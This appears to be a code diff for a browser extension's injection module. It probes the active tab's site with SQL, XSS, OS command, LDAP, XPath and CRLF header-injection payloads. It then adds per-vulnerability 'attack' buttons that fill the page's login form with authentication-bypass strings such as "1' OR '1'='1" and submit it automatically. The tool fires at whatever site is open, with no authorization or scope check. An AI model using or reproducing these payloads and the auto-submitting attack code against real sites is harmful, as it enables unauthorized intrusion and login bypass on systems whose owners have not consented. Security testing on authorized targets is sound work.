@@ -504,151 +504,226 @@ document.getElementById("cfButton").addEventListener("click", async () => {
 
 /* ----------------------- Injection ----------------------- */
 document.getElementById("injectionButton").addEventListener("click", async () => {
-    const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
-    const url = new URL(tab.url);
+  const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
+  const url = new URL(tab.url);
 
-    console.log("Checking for injection vulnerabilities:", url.hostname);
+  console.log("Checking for injection vulnerabilities:", url.hostname);
 
-    const outputDiv = document.getElementById("injectionOutput");
+  const outputDiv = document.getElementById("injectionOutput");
 
-    try {
-        // Array to store detected vulnerabilities
-        const vulnerabilities = [];
+  try {
+    // Array to store detected vulnerabilities
+    const vulnerabilities = [];
 
-        // Test for CWE-89: SQL Injection
-        const sqlInjectionPayload = "username=admin&password=1234' OR '1'='1";
-        const sqlResponse = await fetch(url.href, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-            body: sqlInjectionPayload,
-        });
-        const sqlText = await sqlResponse.text();
-        if (sqlText.includes("error") || sqlText.includes("SQL syntax")) {
-            vulnerabilities.push("CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')");
-        }
+    // === [1] SCANNING LOGIC (same as yours) ===
 
-        // Test for CWE-79: Cross-Site Scripting (XSS)
-        const xssPayload = "<script>alert('XSS')</script>";
-        const xssResponse = await fetch(url.href, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-            body: `username=admin&comment=${encodeURIComponent(xssPayload)}`,
-        });
-        const xssText = await xssResponse.text();
-        if (xssText.includes(xssPayload)) {
-            vulnerabilities.push("CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')");
-        }
-
-        // Test for CWE-77: Command Injection
-        const commandInjectionPayload = "; ls -la";
-        const commandResponse = await fetch(url.href, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-            body: `username=admin&command=${encodeURIComponent(commandInjectionPayload)}`,
-        });
-        const commandText = await commandResponse.text();
-        if (commandText.includes("bin") || commandText.includes("etc")) {
-            vulnerabilities.push("CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')");
-        }
-
-        // Test for CWE-78: OS Command Injection
-        const osCommandInjectionPayload = "| whoami";
-        const osCommandResponse = await fetch(url.href, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-            body: `username=admin&command=${encodeURIComponent(osCommandInjectionPayload)}`,
-        });
-        const osCommandText = await osCommandResponse.text();
-        if (osCommandText.includes("root") || osCommandText.includes("user")) {
-            vulnerabilities.push("CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')");
-        }
-
-        // Test for CWE-90: LDAP Injection
-        const ldapInjectionPayload = "*)(uid=*))(|(uid=*";
-        const ldapResponse = await fetch(url.href, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-            body: `username=${encodeURIComponent(ldapInjectionPayload)}&password=1234`,
-        });
-        const ldapText = await ldapResponse.text();
-        if (ldapText.includes("error") || ldapText.includes("LDAP")) {
-            vulnerabilities.push("CWE-90: Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')");
-        }
-
-        // Test for CWE-91: XML Injection (Blind XPath Injection)
-        const xmlInjectionPayload = "' or '1'='1";
-        const xmlResponse = await fetch(url.href, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/xml' },
-            body: `<user><username>${xmlInjectionPayload}</username><password>1234</password></user>`,
-        });
-        const xmlText = await xmlResponse.text();
-        if (xmlText.includes("error") || xmlText.includes("XPath")) {
-            vulnerabilities.push("CWE-91: XML Injection (aka Blind XPath Injection)");
-        }
-
-        // Test for CWE-113: HTTP Response Splitting
-        const httpResponseSplittingPayload = "%0d%0aSet-Cookie: injected=value";
-        const httpResponseSplittingResponse = await fetch(url.href, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-            body: `username=admin${httpResponseSplittingPayload}`,
-        });
-        const httpResponseSplittingText = await httpResponseSplittingResponse.text();
-        if (httpResponseSplittingText.includes("injected=value")) {
-            vulnerabilities.push("CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')");
-        }
-
-        // Test for CWE-643: XPath Injection
-        const xpathInjectionPayload = "' or '1'='1";
-        const xpathResponse = await fetch(url.href, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-            body: `username=${encodeURIComponent(xpathInjectionPayload)}&password=1234`,
-        });
-        const xpathText = await xpathResponse.text();
-        if (xpathText.includes("error") || xpathText.includes("XPath")) {
-            vulnerabilities.push("CWE-643: Improper Neutralization of Data within XPath Expressions ('XPath Injection')");
-        }
-
-        // Display results
-        if (vulnerabilities.length > 0) {
-            outputDiv.style.borderColor = "red";
-            outputDiv.innerHTML = `
-          ⚠️ Potential injection vulnerabilities detected!
-          <br>
-          Vulnerabilities:
-          <ul>
-            ${vulnerabilities.map((vuln) => `<li>${vuln}</li>`).join("")}
-          </ul>
-        `;
-            outputDiv.innerHTML += `<button id="startAttackButton">Start Attack</button>`;
-
-            // Add event listener to the Start Attack button
-            document.getElementById("startAttackButton").addEventListener("click", () => {
-                // Perform the SQL injection attack when the "Start Attack" button is clicked
-                startSQLInjectionAttack(tab.id);
-            });
-
-        } else {
-            outputDiv.style.borderColor = "green";
-            outputDiv.innerHTML = `✅ No injection vulnerabilities detected.`;
-        }
-    } catch (error) {
-        console.error("Error checking for vulnerabilities:", error);
-        outputDiv.style.borderColor = "red";
-        outputDiv.innerHTML = `❌ Error occurred while checking for vulnerabilities.`;
+    // Test for CWE-89: SQL Injection
+    const sqlInjectionPayload = "username=admin&password=1234' OR '1'='1";
+    const sqlResponse = await fetch(url.href, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: sqlInjectionPayload,
+    });
+    const sqlText = await sqlResponse.text();
+    if (sqlText.includes("error") || sqlText.includes("SQL syntax")) {
+      vulnerabilities.push("CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')");
     }
+
+    // Test for CWE-79: Cross-Site Scripting (XSS)
+    const xssPayload = "<script>alert('XSS')</script>";
+    const xssResponse = await fetch(url.href, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: `username=admin&comment=${encodeURIComponent(xssPayload)}`,
+    });
+    const xssText = await xssResponse.text();
+    if (xssText.includes(xssPayload)) {
+      vulnerabilities.push("CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')");
+    }
+
+    // Test for CWE-77: Command Injection
+    const commandInjectionPayload = "; ls -la";
+    const commandResponse = await fetch(url.href, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: `username=admin&command=${encodeURIComponent(commandInjectionPayload)}`,
+    });
+    const commandText = await commandResponse.text();
+    if (commandText.includes("bin") || commandText.includes("etc")) {
+      vulnerabilities.push("CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')");
+    }
+
+    // Test for CWE-78: OS Command Injection
+    const osCommandInjectionPayload = "| whoami";
+    const osCommandResponse = await fetch(url.href, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: `username=admin&command=${encodeURIComponent(osCommandInjectionPayload)}`,
+    });
+    const osCommandText = await osCommandResponse.text();
+    if (osCommandText.includes("root") || osCommandText.includes("user")) {
+      vulnerabilities.push("CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')");
+    }
+
+    // Test for CWE-90: LDAP Injection
+    const ldapInjectionPayload = "*)(uid=*))(|(uid=*";
+    const ldapResponse = await fetch(url.href, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: `username=${encodeURIComponent(ldapInjectionPayload)}&password=1234`,
+    });
+    const ldapText = await ldapResponse.text();
+    if (ldapText.includes("error") || ldapText.includes("LDAP")) {
+      vulnerabilities.push("CWE-90: Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')");
+    }
+
+    // Test for CWE-91: XML Injection (Blind XPath Injection)
+    const xmlInjectionPayload = "' or '1'='1";  // This is a common XPath injection payload
+
+    const xmlResponse = await fetch(url.href, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/xml' },
+    body: `<user><username>${xmlInjectionPayload}</username><password>1234</password></user>`,
+    });
+
+    const xmlText = await xmlResponse.text();
+
+    // Check the response for specific issues that could indicate XPath injection vulnerability
+    if (
+    // Check for signs that the injected payload might have altered the XPath query
+    xmlText.includes("error") || 
+    xmlText.includes("XPath") || 
+    xmlText.includes("invalid") ||   // A typical response when XPath queries fail
+    xmlText.includes("syntax")      // XPath query errors often have syntax-related terms
+    ) {
+    // Avoid false positives by being specific about XPath errors and injection patterns
+    vulnerabilities.push("CWE-91: XML Injection (aka Blind XPath Injection)");
+    } else {
+    // Log or handle the case where no vulnerability was detected
+    console.log("No evidence of XPath injection vulnerability.");
+    }
+
+
+    // Test for CWE-113: HTTP Response Splitting
+    const httpResponseSplittingPayload = "%0d%0aSet-Cookie: injected=value";
+    const httpResponseSplittingResponse = await fetch(url.href, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: `username=admin${httpResponseSplittingPayload}`,
+    });
+    const httpResponseSplittingText = await httpResponseSplittingResponse.text();
+    if (httpResponseSplittingText.includes("injected=value")) {
+      vulnerabilities.push("CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')");
+    }
+
+    // === [2] SHOW RESULTS & CREATE BUTTONS FOR EACH CWE ===
+
+    if (vulnerabilities.length > 0) {
+      outputDiv.style.borderColor = "red";
+      outputDiv.innerHTML = `
+        ⚠️ Potential injection vulnerabilities detected!
+        <br>
+        Vulnerabilities:
+        <ul>
+          ${vulnerabilities.map((vuln) => `<li>${vuln}</li>`).join("")}
+        </ul>
+        <p style="text-decoration: underline;">Select an attack to perform:</p>
+      `;
+
+      // Create a container for the buttons
+      let buttonsHtml = "<div>";
+      vulnerabilities.forEach((vuln) => {
+        // Parse out the CWE number (e.g., "89" from "CWE-89: ...")
+        const cweNumber = parseCweNumber(vuln);
+        if (cweNumber) {
+          buttonsHtml += `<button class="attackButton" data-cwe="${cweNumber}">CWE-${cweNumber}</button> `;
+        }
+      });
+      buttonsHtml += "</div>";
+      outputDiv.innerHTML += buttonsHtml;
+
+      // Add event listeners to each button
+      document.querySelectorAll(".attackButton").forEach((button) => {
+        button.addEventListener("click", () => {
+          const cweNumber = button.getAttribute("data-cwe");
+          handleAttack(cweNumber, tab.id);
+        });
+      });
+    } else {
+      outputDiv.style.borderColor = "green";
+      outputDiv.innerHTML = `✅ No injection vulnerabilities detected.`;
+    }
+  } catch (error) {
+    console.error("Error checking for vulnerabilities:", error);
+    outputDiv.style.borderColor = "red";
+    outputDiv.innerHTML = `❌ Error occurred while checking for vulnerabilities.`;
+  }
 });
 
-// Function to start the SQL injection attack when the button is pressed
-function startSQLInjectionAttack(tabId) {
-    const sqlInjectionPayload = "1' OR '1'='1"; // The payload to inject
-    chrome.scripting.executeScript({
-        target: { tabId: tabId },
-        func: fillSQLInjection,
-        args: [sqlInjectionPayload]
-    });
+// === [3] HELPER FUNCTIONS FOR ATTACK BUTTONS ===
+
+// A map of payloads for each CWE
+const cweAttackPayloads = {
+  // Example: SQL Injection (CWE-89)
+  "89": {
+    username: "1' OR '1'='1",
+    password: "1' OR '1'='1",
+  },
+  // Example: LDAP Injection (CWE-90)
+  "90": {
+    username: "*admin)(|(uid=*))",
+    password: "anything",
+  },
+  // Example: XML Injection (CWE-91)
+  "91": {
+    username: "admin' or '1'='1",
+    password: "anything",
+  },
+  /*can add more payloads here, but due to time constraint only 3 are mentioned*/
+};
+
+/**
+ * Extract the CWE number from a outputted CWEs:
+ */
+function parseCweNumber(vulnString) {
+  const match = vulnString.match(/^CWE-(\d+)/);
+  return match ? match[1] : null;
+}
+
+/**
+ * Handle the attack for a specific CWE.
+ * This will inject the payload into the current tab's login form.
+ */
+function handleAttack(cweNumber, tabId) {
+  const payload = cweAttackPayloads[cweNumber];
+  if (!payload) {
+    console.warn(`No attack payload defined for CWE-${cweNumber}`);
+    return;
+  }
+
+  chrome.scripting.executeScript({
+    target: { tabId: tabId },
+    func: fillFormFields,
+    args: [payload.username, payload.password],
+  });
+}
+
+/**
+ * This function runs **in the context of the webpage** to fill the form fields.
+ */
+function fillFormFields(usernameValue, passwordValue) {
+  const usernameField = document.querySelector("input[name='username']");
+  const passwordField = document.querySelector("input[name='password']");
+  if (usernameField && passwordField) {
+    usernameField.value = usernameValue;
+    passwordField.value = passwordValue;
+
+    // Optionally submit the form automatically:
+    const form = document.querySelector("form");
+    if (form) {
+      form.submit();
+    }
+  }
 }
 
 // Function to fill the login form with SQL injection payload
@@ -667,6 +742,7 @@ function fillSQLInjection(payload) {
         }
     }
 }
+
 
 /* ----------------------- Server-Side Request Forgery ----------------------- */
 document.getElementById("scanSSRFButton").addEventListener("click", async () => {
